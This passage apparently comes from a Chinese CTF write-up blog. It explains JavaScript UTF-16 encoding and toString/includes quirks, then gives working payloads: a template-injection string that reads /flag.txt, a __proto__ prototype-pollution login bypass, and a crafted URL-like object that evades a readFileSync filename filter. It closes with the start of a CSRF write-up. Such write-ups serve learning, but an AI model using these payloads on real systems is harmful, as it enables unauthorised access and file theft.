class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(username.<span class="title function_">toString</span>().<span class="title function_">substring</span>(<span class="number">0</span>,<span class="number">2</span>)===admin.<span class="property">username</span>.<span class="title function_">substring</span>(<span class="number">0</span>,<span class="number">2</span>)&amp;&amp;password===admin.<span class="property">password</span>.<span class="title function_">substring</span>(<span class="number">1</span>,<span class="number">15</span>))&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span><br><span class="line">                req.<span class="property">session</span>.<span class="property">user</span>=&#123;<span class="string">&#x27;username&#x27;</span>:username,<span class="string">&#x27;isadmin&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>)</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                req.<span class="property">session</span>.<span class="property">user</span>=&#123;<span class="string">&#x27;username&#x27;</span>:username&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;please enter usrname or password&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/admin&#x27;</span>,<span class="title class_">IfLogin</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">isadmin</span>===<span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> hello=<span class="string">&#x27;welcome &#x27;</span>+req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">username</span></span><br><span class="line"></span><br><span class="line">        res.<span class="property">send</span> (pugjs.<span class="title function_">render</span>(hello))</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;you are not admin&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">listen</span>(<span class="string">&#x27;8080&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening at http://localhost:8080`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>大概是三个要点，一是 <strong>JavaScript</strong> 对
<strong>emoji</strong> 字符的编码。</p>
<h2 id="编码">编码</h2>
<p><strong>JavaScript</strong> 采用的是 <strong>Unicode</strong>
字符集，<strong>UTF-16</strong> 编码，因此对于一个
<strong>emoji</strong> 字符来说，其在 <strong>JavaScript</strong>
中表示的长度为 <strong>2</strong>。</p>
<p>其中 <strong>charCodeAt</strong> 方法返回一个介于
<strong>0-65535</strong> 之间的整数，表示给定索引处的
<strong>UTF-16</strong> 代码单元。</p>
<p>而 <strong>codePointAt</strong> 方法返回一个非负整数，表示
<strong>Unicode</strong> 码点。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> emoji = <span class="string">&quot;😍&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(emoji.<span class="property">length</span>) <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">in</span> emoji) &#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(emoji[i].<span class="title function_">charCodeAt</span>(<span class="number">0</span>))&#125; <span class="comment">// 55357 56845</span></span><br><span class="line"></span><br><span class="line">emoji.<span class="title function_">codePointAt</span>(<span class="number">0</span>) <span class="comment">// 128525</span></span><br></pre></td></tr></table></figure>
<h3 id="unicode">Unicode</h3>
<p><strong>Unicode</strong> 字符集目前分了 <strong>17</strong>
个区，最前面的 <strong>65536</strong> 个字符在基本平面<strong>（BMP,
Basic Multilingual Plane）</strong>, 码点范围 <strong>U+0000 -
U+FFFF</strong>。剩余的字符都在辅助平面<strong>（SMP, Supplementary
Multilingual Plane）</strong>，有 <strong>16</strong> 个，码点范围
<strong>U+010000 - U+10FFFF</strong>。<strong>emoji</strong>
字符都在辅助平面，在解析的时候，可以使用 <strong>U+200D</strong>
零宽连字符，将两个 <strong>emoji</strong> 连起来，使其看起来像是一个
<strong>emoji</strong>，不支持的系统会忽略零宽连字，直接显示多个
<strong>emoji</strong> 字符。</p>
<h3 id="utf-16">UTF-16</h3>
<p>对于 <strong>Unicode</strong> 来说，<strong>U+D800 - U+DFFF</strong>
是保留的码位区间。而 <strong>UTF-16</strong>
便使用这个区间来对辅助平面的字符进行编码，其将区间 <strong>U+D800 -
U+DBFF</strong> 划为高位 <strong>H</strong>，<strong>U+DC00 -
U+DFFF</strong> 划为低位 <strong>L</strong>，有以下公式。</p>
<p><span class="math display">\[
\mbox{}H = Math.floor((C-\mbox{0x10000}) / \mbox{0x400})+\mbox{0xD800}
\]</span></p>
<p><span class="math display">\[
L = (C - \mbox{0x10000})\ mod\ \mbox{0x400} + \mbox{0xDC00}
\]</span></p>
<p>代入上文 <strong>codePointAt</strong> 返回的
<strong>128525</strong>，可以分别得到 <strong>charCodeAt</strong>
先后打印的值 <strong>55357、56845</strong>。</p>
<p>因此当遇到第一个字符【头两个字节】的码点在 <strong>U+D800 -
U+DBFF</strong> 区间【高位
<strong>H</strong>】上的时候，就需要和后一个字符【后两个字节】连着解码。</p>
<h2 id="tostring">ToString</h2>
<h3 id="数字类型">数字类型</h3>
<p>十进制数转换为字符串：将数字对象的 <strong>toString()</strong>
方法应用于数字，可以指定要转换的进制作为可选参数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> number = <span class="number">42</span>;</span><br><span class="line"><span class="keyword">var</span> str = number.<span class="title function_">toString</span>(); <span class="comment">// 默认转换为十进制</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str); <span class="comment">// 42</span></span><br></pre></td></tr></table></figure>
<p>其他进制转换为字符串：指定要转换的进制作为
<strong>toString()</strong> 方法的参数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> number = <span class="number">42</span>;</span><br><span class="line"><span class="keyword">var</span> str = number.<span class="title function_">toString</span>(<span class="number">16</span>); <span class="comment">// 转换为十六进制</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str); <span class="comment">// 2a</span></span><br></pre></td></tr></table></figure>
<h3 id="字符串类型">字符串类型</h3>
<p>字符串对象的 <strong>toString()</strong> 方法返回字符串自身。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> result = str.<span class="title function_">toString</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// Hello</span></span><br></pre></td></tr></table></figure>
<h3 id="布尔类型">布尔类型</h3>
<p>布尔对象的 <strong>toString()</strong>
方法返回布尔值的字符串表示。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> bool = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> result = bool.<span class="title function_">toString</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h3 id="数组类型">数组类型</h3>
<p>数组对象的 <strong>toString()</strong>
方法将数组的所有元素转换为字符串，并用逗号分隔。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> result = arr.<span class="title function_">toString</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// 1,2,3</span></span><br></pre></td></tr></table></figure>
<h2 id="includes">includes</h2>
<p>在 <strong>JavaScript</strong> 中，<strong>includes()</strong>
方法用于检查数组或字符串中是否包含指定的元素或子字符串，并返回相应的布尔值。</p>
<h3 id="字符串类型-1">字符串类型</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">includes</span>(<span class="string">&quot;World&quot;</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">includes</span>(<span class="string">&quot;Hi&quot;</span>)); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h3 id="数组类型-1">数组类型</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(array.<span class="title function_">includes</span>(<span class="number">3</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(array.<span class="title function_">includes</span>(<span class="number">6</span>)); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>以及对于数组类型还有如下结果。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> array = [<span class="string">&#x27;ad&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(array.<span class="title function_">includes</span>(<span class="string">&#x27;ad&#x27;</span>)); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> array = [<span class="string">&#x27;admin&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(array.<span class="title function_">includes</span>(<span class="string">&#x27;ad&#x27;</span>)); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h2 id="结论">结论</h2>
<p>因为 <strong>/admin</strong> 路由中是当
<strong>isadmin==='1'</strong> 的时候，才去获取
<strong>username</strong> 传入的参数，使用 <strong>render</strong>
方法解析。</p>
<p>那么结合上文引入的 <strong>ejs</strong> 和 <strong>pug</strong>
可以猜测是一个 <strong>ejs</strong> 模板引擎注入。</p>
<p>而要给 <strong>req.session.user.username</strong> 传参，需要满足
<strong>/login</strong> 中的登录条件。</p>
<p>结合上述 <strong>toString</strong> 和 <strong>includes</strong>
方法的一些特性，可以不难得出 <strong>username</strong> 传入数组形式的
<strong>payload</strong> 的结论。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;username&quot;</span>: [<span class="string">&quot;ad#&#123;global.process.mainModule.constructor._load(&#x27;fs&#x27;).readFileSync(&#x27;/flag.txt&#x27;)&#125;&quot;</span>]</span><br></pre></td></tr></table></figure>
<p>这样对于 <strong>username.includes('ad')</strong>
可以绕过，因为传入的不是 <strong>["ad"]</strong>，而
<strong>toString</strong> 后获得的字符串也是以 <strong>ad</strong>
开头。</p>
<p>接下来是对 <strong>admin.password.substring(1,15)</strong>
的绕过。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(admin.<span class="property">password</span>.<span class="title function_">substring</span>(<span class="number">1</span>,<span class="number">15</span>).<span class="title function_">charCodeAt</span>(<span class="number">0</span>).<span class="title function_">toString</span>(<span class="number">16</span>)) <span class="comment">// de0d</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(admin.<span class="property">password</span>.<span class="title function_">substring</span>(<span class="number">1</span>,<span class="number">15</span>).<span class="title function_">charCodeAt</span>(<span class="number">13</span>).<span class="title function_">toString</span>(<span class="number">16</span>)) <span class="comment">// d83d</span></span><br></pre></td></tr></table></figure>
<p>得到头尾半个 <strong>Unicode</strong> 编码的 <strong>emoji</strong>
字符。</p>
<p>最后构造 <strong>payload</strong>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;ad#&#123;global.process.mainModule.constructor._load(&#x27;fs&#x27;).readFileSync(&#x27;/flag.txt&#x27;)&#125;&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;\ude0d😂😍😒😘💕😁\ud83d&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="pollution">pollution</h1>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> expres = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">JSON</span>5 = <span class="built_in">require</span>(<span class="string">&#x27;json5&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> rand = <span class="built_in">require</span>(<span class="string">&#x27;string-random&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET</span> = <span class="title function_">rand</span>(<span class="number">32</span>, <span class="string">&#x27;0123456789abcdef&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">80</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">expres</span>()</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;))</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="variable constant_">SECRET</span>,</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123;<span class="attr">maxAge</span>: <span class="number">3600</span> * <span class="number">1000</span>&#125;</span><br><span class="line">&#125;));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">obj, arr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> verify = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(obj).<span class="title function_">forEach</span>(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr.<span class="title function_">indexOf</span>(key) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">            verify = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> verify;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;hellllllo!&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> userinfo = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">const</span> user = <span class="title class_">JSON</span>5.<span class="title function_">parse</span>(userinfo)</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">waf</span>(user, [<span class="string">&#x27;admin&#x27;</span>])) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">user</span> = user</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">admin</span> == <span class="literal">true</span>) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">user</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;login success!&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;login error!&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/dosometing&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>.<span class="property">file</span>).<span class="title function_">includes</span>(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">            req.<span class="property">body</span>.<span class="property">file</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> flag = fs.<span class="title function_">readFileSync</span>(req.<span class="property">body</span>.<span class="property">file</span>)</span><br><span class="line">        res.<span class="title function_">send</span>(flag.<span class="title function_">toString</span>())</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;you are not admin&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/for_check&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/app/app.js&#x27;</span>).<span class="title function_">toString</span>())</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening on port <span class="subst">$&#123;port&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>原型链污染比较简单。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>__proto__<span class="punctuation">:</span> <span class="punctuation">&#123;</span>admin<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>读文件需要细究一下 <strong>readFileSync</strong>。</p>
<h2 id="readfilesync">readFileSync</h2>
<p>调用栈如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getPathFromURLPosix(), url:1467</span><br><span class="line">fileURLToPath(), url:1488</span><br><span class="line">toPathIfFileURL(), url:1567</span><br><span class="line">__node_internal_(), utils:687</span><br><span class="line">openSync(), fs:592</span><br><span class="line">readFileSync(), fs:468</span><br></pre></td></tr></table></figure>
<p>首先是调用 <strong>openSync</strong> 方法。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">readFileSync</span>(<span class="params">path, options</span>) &#123;</span><br><span class="line">  options = <span class="title function_">getOptions</span>(options, &#123; <span class="attr">flag</span>: <span class="string">&#x27;r&#x27;</span> &#125;);</span><br><span class="line">  <span class="keyword">const</span> isUserFd = <span class="title function_">isFd</span>(path); <span class="comment">// File descriptor ownership</span></span><br><span class="line">  <span class="keyword">const</span> fd = isUserFd ? path : fs.<span class="title function_">openSync</span>(path, options.<span class="property">flag</span>, <span class="number">0o666</span>);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>openSync</strong> 中会用 <strong>getValidatedPath</strong>
对路径的合法性进行校验。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">openSync</span>(<span class="params">path, flags, mode</span>) &#123;</span><br><span class="line">  path = <span class="title function_">getValidatedPath</span>(path);</span><br><span class="line">  <span class="keyword">const</span> flagsNumber = <span class="title function_">stringToFlags</span>(flags);</span><br><span class="line">  mode = <span class="title function_">parseFileMode</span>(mode, <span class="string">&#x27;mode&#x27;</span>, <span class="number">0o666</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> ctx = &#123; path &#125;;</span><br><span class="line">  <span class="keyword">const</span> result = binding.<span class="title function_">open</span>(pathModule.<span class="title function_">toNamespacedPath</span>(path),</span><br><span class="line">                              flagsNumber, mode,</span><br><span class="line">                              <span class="literal">undefined</span>, ctx);</span><br><span class="line">  <span class="title function_">handleErrorFromBinding</span>(ctx);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>getValidatedPath</strong> 中用
<strong>toPathIfFileURL</strong> 获取路径。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> getValidatedPath = <span class="title function_">hideStackFrames</span>(<span class="function">(<span class="params">fileURLOrPath, propName = <span class="string">&#x27;path&#x27;</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> path = <span class="title function_">toPathIfFileURL</span>(fileURLOrPath);</span><br><span class="line">  <span class="title function_">validatePath</span>(path, propName);</span><br><span class="line">  <span class="keyword">return</span> path;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><strong>toPathIfFileURL</strong> 中使用
<strong>isURLInstance</strong> 判断路径是 <strong>URL</strong> 还是
<strong>Path</strong>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">toPathIfFileURL</span>(<span class="params">fileURLOrPath</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_">isURLInstance</span>(fileURLOrPath))</span><br><span class="line">    <span class="keyword">return</span> fileURLOrPath;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">fileURLToPath</span>(fileURLOrPath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>isURLInstance</strong> 中，当路径存在 <strong>href</strong>
和 <strong>origin</strong> 属性时被判定为 <strong>URL</strong>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isURLInstance</span>(<span class="params">fileURLOrPath</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> fileURLOrPath != <span class="literal">null</span> &amp;&amp; fileURLOrPath.<span class="property">href</span> &amp;&amp; fileURLOrPath.<span class="property">origin</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后调用 <strong>fileURLToPath</strong> 方法转换 <strong>URL</strong>
为 <strong>Path</strong>，其中 <strong>protocol</strong> 属性需要为
<strong>file:</strong>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fileURLToPath</span>(<span class="params">path</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> path === <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">    path = <span class="keyword">new</span> <span class="title function_">URL</span>(path);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="title function_">isURLInstance</span>(path))</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_ARG_TYPE</span>(<span class="string">&#x27;path&#x27;</span>, [<span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;URL&#x27;</span>], path);</span><br><span class="line">  <span class="keyword">if</span> (path.<span class="property">protocol</span> !== <span class="string">&#x27;file:&#x27;</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_URL_SCHEME</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> isWindows ? <span class="title function_">getPathFromURLWin32</span>(path) : <span class="title function_">getPathFromURLPosix</span>(path);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于不是 <strong>Windows</strong>，因此进入
<strong>getPathFromURLPosix</strong> 来获取
<strong>path</strong>，在这个方法中，<strong>hostname</strong>
需要为空字符，然后对 <strong>pathname</strong> 进行一次
<strong>URL</strong> 解码并返回。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getPathFromURLPosix</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (url.<span class="property">hostname</span> !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_FILE_URL_HOST</span>(platform);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> pathname = url.<span class="property">pathname</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> n = <span class="number">0</span>; n &lt; pathname.<span class="property">length</span>; n++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pathname[n] === <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> third = pathname.<span class="title function_">codePointAt</span>(n + <span class="number">2</span>) | <span class="number">0x20</span>;</span><br><span class="line">      <span class="keyword">if</span> (pathname[n + <span class="number">1</span>] === <span class="string">&#x27;2&#x27;</span> &amp;&amp; third === <span class="number">102</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_FILE_URL_PATH</span>(</span><br><span class="line">          <span class="string">&#x27;must not include encoded / characters&#x27;</span></span><br><span class="line">        );</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(pathname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="结论-1">结论</h2>
<p>传入 <strong>href</strong> 和 <strong>origin</strong>
不为空，<strong>protocol</strong> 为
<strong>file:</strong>，<strong>hostname</strong> 为空字符，这时
<strong>pathname</strong> 可以通过 <strong>URL</strong> 编码绕过
<strong>includes("flag")</strong> 的判定。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;href&quot;</span><span class="punctuation">:</span><span class="string">&quot;x&quot;</span><span class="punctuation">,</span><span class="attr">&quot;origin&quot;</span><span class="punctuation">:</span><span class="string">&quot;x&quot;</span><span class="punctuation">,</span><span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span><span class="string">&quot;file:&quot;</span><span class="punctuation">,</span><span class="attr">&quot;hostname&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;pathname&quot;</span><span class="punctuation">:</span><span class="string">&quot;/fl%61g.txt&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h1 id="refer">REFER</h1>
<p><a href="https://xz.aliyun.com/t/11512"><strong>PHP</strong>
变量流量层面 <strong>WAF</strong> 绕过</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 强网杯 线上预选赛 部分题解</title>
    <url>/2022-QWB-Preliminary/</url>
    <content><![CDATA[<p><img
src="/images/2022-QWB-Preliminary//image-20220802201444059.png" /></p>
<p>只有强网先锋的命。</p>
<span id="more"></span>
<h1 id="babyweb">babyweb</h1>
<p>题目提示如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你: help</span><br><span class="line">bot: </span><br><span class="line">1. help: 帮助菜单</span><br><span class="line">2. changepw: 修改密码</span><br><span class="line">示例: changepw 123456</span><br><span class="line">3. bugreport: 向管理员报告漏洞页面</span><br><span class="line">示例: bugreport http://host:port/login</span><br></pre></td></tr></table></figure>
<p>构造<strong>CSRF</strong>，修改管理员密码。</p>
